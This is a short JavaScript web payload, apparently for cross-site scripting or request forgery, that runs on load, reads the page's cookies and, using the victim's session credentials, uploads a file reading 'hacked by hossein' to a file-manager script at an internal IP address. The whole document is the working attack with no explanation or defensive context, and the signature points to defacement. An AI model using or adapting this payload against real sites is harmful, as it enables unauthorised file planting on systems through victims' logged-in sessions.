(async () => {
    const cookie = document.cookie;
  
    
    const content = "hacked by hossein";
    const file = new File([content], "pwned.txt", { type: "text/plain" });
  
    
    const form = new FormData();
    form.append("localfile", file);
    form.append("MAX_FILE_SIZE", "1000000");
    form.append("act", "upload");
    form.append("dir", "");
    form.append("submit", "Upload");
  
    
    await fetch("https://10.23.108.10/app/ft/ft2.php", {
      method: "POST",
      credentials: "include", 
      body: form
    });
  })();
  